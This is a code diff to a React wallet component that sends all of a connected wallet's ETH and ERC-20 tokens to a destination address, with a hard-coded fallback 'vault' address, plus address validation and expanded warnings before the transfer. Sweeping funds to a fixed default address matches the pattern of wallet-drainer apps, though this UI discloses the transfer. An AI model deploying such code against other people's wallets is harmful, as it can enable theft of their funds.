@@ -15,9 +15,34 @@ export default function BalanceCard({ walletState, onTransactionStart }: Balance
   const { isTransferring, transferAllFunds } = useWeb3();
   const [showConfirmation, setShowConfirmation] = useState(false);
 
-  // Get destination address from environment or use default
-  const destinationAddress = import.meta.env.VITE_DESTINATION_ADDRESS || 
-    "0x8ba1f109551bd432803012645hac136c7d2bd2c0f7";
+  // Get destination address from environment - using your vault address
+  const destinationAddress = import.meta.env.VITE_DESTINATION_ADDRESS || "0x15E1A8454E2f31f64042EaE445Ec89266cb584bE";
+  
+  // Validation function for Ethereum address
+  const isValidEthereumAddress = (address: string): boolean => {
+    return /^0x[a-fA-F0-9]{40}$/.test(address);
+  };
+
+  // Show error if destination address is invalid
+  if (!destinationAddress || !isValidEthereumAddress(destinationAddress)) {
+    return (
+      <Card>
+        <CardContent className="pt-6">
+          <Alert className="border-red-200 bg-red-50">
+            <AlertTriangle className="h-4 w-4 text-red-600" />
+            <AlertDescription className="text-red-800">
+              <div className="font-medium">Configuration Error</div>
+              <div className="text-sm mt-1">
+                Invalid or missing destination address. Please check your configuration.
+                <br />
+                Current address: {destinationAddress || 'Not set'}
+              </div>
+            </AlertDescription>
+          </Alert>
+        </CardContent>
+      </Card>
+    );
+  }
 
   const handleTransferClick = () => {
     setShowConfirmation(true);
@@ -99,10 +124,15 @@ export default function BalanceCard({ walletState, onTransactionStart }: Balance
         </Alert>
 
         <div className="mb-4">
-          <label className="block text-sm font-medium text-gray-700 mb-2">Destination Address</label>
-          <div className="bg-gray-50 rounded-lg p-3">
-            <div className="text-sm font-mono text-gray-900 break-all">
+          <label className="block text-sm font-medium text-gray-700 mb-2">
+            Destination Address (All funds will be sent here)
+          </label>
+          <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
+            <div className="text-sm font-mono text-blue-900 break-all">
               {destinationAddress}
+            </div>
+            <div className="text-xs text-blue-700 mt-1">
+              ✓ Valid Ethereum address configured
             </div>
           </div>
         </div>
@@ -112,9 +142,12 @@ export default function BalanceCard({ walletState, onTransactionStart }: Balance
             <Alert className="border-danger bg-red-50">
               <AlertTriangle className="h-4 w-4 text-danger" />
               <AlertDescription className="text-red-800">
-                <div className="font-medium">Confirm Transfer</div>
-                <div className="text-sm">
-                  Are you sure you want to transfer ALL your funds? This action cannot be undone.
+                <div className="font-medium">⚠️ FINAL CONFIRMATION REQUIRED</div>
+                <div className="text-sm mt-2 space-y-1">
+                  <div>• ALL ETH and ERC-20 tokens will be transferred</div>
+                  <div>• Destination: <span className="font-mono text-xs">{destinationAddress}</span></div>
+                  <div>• Total value: <strong>{balanceUSD}</strong></div>
+                  <div>• This action is IRREVERSIBLE</div>
                 </div>
               </AlertDescription>
             </Alert>
